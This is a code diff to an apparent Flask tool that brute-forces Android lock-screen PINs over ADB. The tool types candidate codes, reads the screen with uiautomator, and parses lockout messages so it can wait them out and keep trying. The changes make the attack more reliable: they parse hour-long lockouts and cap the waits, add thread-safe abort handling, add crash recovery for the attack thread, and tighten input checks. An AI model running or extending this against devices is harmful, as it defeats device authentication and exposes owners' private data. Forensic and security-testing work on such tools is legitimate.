@@ -78,10 +78,10 @@ def _sequential_pins(length=6, cap=None):
 # Lockout ladder parsing — the device tells us how long to wait
 # --------------------------------------------------------------------------
 _LOCKOUT_PATTERNS = [
-    # EN: "Try again in 30 seconds" / "in 5 minutes"
-    re.compile(r"(?:try|retry|attempt)[^0-9]{0,24}(\d+)\s*(second|minute)", re.I),
-    # FR: "Réessayez dans 30 secondes" / "dans 5 minutes"
-    re.compile(r"(?:r[ée]essayez|attendre?)[^0-9]{0,24}(\d+)\s*(seconde|minute)", re.I),
+    # EN: "Try again in 30 seconds" / "in 5 minutes" / "in 2 hours"
+    re.compile(r"(?:try|retry|attempt)[^0-9]{0,24}(\d+)\s*(second|minute|hour)", re.I),
+    # FR: "Réessayez dans 30 secondes" / "dans 5 minutes" / "dans 2 heures"
+    re.compile(r"(?:r[ée]essayez|attendre?)[^0-9]{0,24}(\d+)\s*(seconde|minute|heure)", re.I),
 ]
 _WRONG_PATTERNS = [
     re.compile(r"(wrong|incorrect|falsch|erron)", re.I),
@@ -96,8 +96,14 @@ def _parse_lockscreen_toast(xml_text):
         if m:
             n = int(m.group(1))
             unit = m.group(2).lower()
-            secs = n * 60 if unit.startswith("min") else n
-            return ("locked", max(secs, 5))
+            if unit.startswith(("hour", "heure")):
+                secs = n * 3600
+            elif unit.startswith("min"):
+                secs = n * 60
+            else:
+                secs = n
+            # fix: clamp — a misparsed toast must never park the siege for hours
+            return ("locked", min(max(secs, 5), 3600))
     for rx in _WRONG_PATTERNS:
         if rx.search(low):
             return ("wrong", None)
@@ -180,6 +186,12 @@ class _SiegeState:
 STATE = _SiegeState()
 
 
+def _aborting():
+    """fix: abort flag read under the state lock — no naked reads."""
+    with STATE.lock:
+        return STATE.abort
+
+
 def _try_code(code, serial):
     """One attempt: type + enter, read verdict from the screen itself.
 
@@ -189,14 +201,15 @@ def _try_code(code, serial):
     filtering claims.
     """
     code = str(code).strip()
-    if not (4 <= len(code) <= 8 and code.isdigit()):
+    # fix: isascii gate — str.isdigit() accepts Unicode digits/superscripts
+    if not (4 <= len(code) <= 8 and code.isascii() and code.isdigit()):
         return "REJECTED", 0
     engine.shell(f"input text {code}", serial=serial, timeout=8)
-    if STATE.abort:
+    if _aborting():
         return "ABORTED", 0
     engine.shell("input keyevent 66", serial=serial, timeout=8)     # ENTER
     time.sleep(0.85)                                                # let UI settle
-    if STATE.abort:
+    if _aborting():
         return "ABORTED", 0
     dump = engine.shell("uiautomator dump /sdcard/siege_ui.xml && "
                         "cat /sdcard/siege_ui.xml >/dev/null && "
@@ -211,7 +224,7 @@ def _try_code(code, serial):
     # Secondary: toast/screen text for wrong-vs-lockout ladder
     xml_res = engine.shell("cat /sdcard/siege_ui.xml 2>/dev/null || true",
                            serial=serial, timeout=12)
-    if STATE.abort:
+    if _aborting():
         return "ABORTED", 0
     verdict, wait = _parse_lockscreen_toast(xml_res.get("stdout", ""))
     engine.shell("rm -f /sdcard/siege_ui.xml", serial=serial, timeout=8)
@@ -221,7 +234,27 @@ def _try_code(code, serial):
 
 
 def _run_siege(codes, serial, proof_cmd):
+    """Thread entry — owns the finalizer so a crash can never wedge STATE.
+
+    fix: the whole siege body now runs inside try/finally; previously an
+    exception outside _try_code killed the thread while STATE.running
+    stayed True — /start 409'd forever and /stop could never clear it.
+    """
     STATE.note(f"siege opened on {serial or 'default device'}")
+    try:
+        _siege_body(codes, serial, proof_cmd)
+    except Exception as exc:
+        STATE.note(f"siege crashed: {exc!r}")
+        log.exception("siege thread crashed")
+    finally:
+        with STATE.lock:
+            STATE.running = False
+            STATE.current_code = None
+            STATE.finished_at = time.strftime("%Y-%m-%d %H:%M:%S")
+        STATE.note("siege closed")
+
+
+def _siege_body(codes, serial, proof_cmd):
     _wake_and_ready(serial)
     consecutive_errors = 0
     for code in codes:
@@ -291,10 +324,7 @@ def _run_siege(codes, serial, proof_cmd):
                 STATE.note(f"at={attempts_now} last={code}")
             time.sleep(0.15)
 
-    with STATE.lock:
-        STATE.running = False
-        STATE.finished_at = time.strftime("%Y-%m-%d %H:%M:%S")
-    STATE.note("siege closed")
+    # finalizer lives in _run_siege's finally block
 
 
 @siege_bp.route("/start", methods=["POST"])
@@ -321,9 +351,10 @@ def start():
     if preset == "custom" and not custom:
         return jsonify({"success": False,
                         "error": "preset custom sans codes"}), 400
-    # Intake gate: a PIN is 4-8 digits. Everything else is payload, not a code.
+    # fix: intake gate also ASCII-strict — payload must never ride `input text`
     custom = [str(c).strip() for c in custom
-              if 4 <= len(str(c).strip()) <= 8 and str(c).strip().isdigit()]
+              if 4 <= len(str(c).strip()) <= 8
+              and str(c).strip().isascii() and str(c).strip().isdigit()]
 
     if preset == "sequential6":
         stream = _sequential_pins(cap=max_attempts)
